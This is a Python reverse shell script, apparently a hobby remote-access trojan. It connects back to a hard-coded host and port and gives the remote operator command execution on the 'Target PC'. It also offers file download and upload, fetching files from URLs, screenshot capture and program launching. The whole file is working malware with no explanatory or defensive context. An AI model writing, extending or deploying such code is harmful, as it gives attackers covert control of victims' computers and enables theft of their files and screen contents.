#!/bin/python

import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
from mss import mss

def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data)

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue


def screenshot():
    with mss() as screenshot:
        screenshot.shot()


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def connection():
    while True:
        time.sleep(5)
        try:
            sock.connect(("192.168.1.210",1234))
            shell()
        except: 
            connection()

def shell():
    while True:
        command = reliable_recv()
        if command == 'exit':
            break
        elif command == "help":
            help_options = '''                  download path --> Download a file from Target PC
                    upload path --> Upload a file to Target PC
                    get url     --> Download a file to Target from a website
                    check       --> check the privileges you have
                    screenshot  --> takes a screenshot
                    start path  --> start program on target
                    exit        --> exit shell'''
            reliable_send(help_options)
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                reliable_send(base64.b64encode(file.read()))
        elif command[:6] == "upload":
            with open(command[7:], "wb") as fin:
                file_data = reliable_recv()
                fin.write(base64.b64decode(file_data))
        elif command[:3] == "get":
                try:
                    download(command[4:])
                    reliable_send("[+] Download Successful [+]")
                except:
                    reliable_send("[-] Failed To Download [-]")
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    reliable_send(base64.b64encode(sc.read()))
                os.remove("monitor-1.png")
            except:
                reliable_send("[!!] Failed To Take Screenshot [!!]")
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Started [+]")
            except:
                reliable_send("[!!] Failed To Start [!!]")
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            result = unicode(result, errors='replace')
            reliable_send(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


connection()
sock.close()



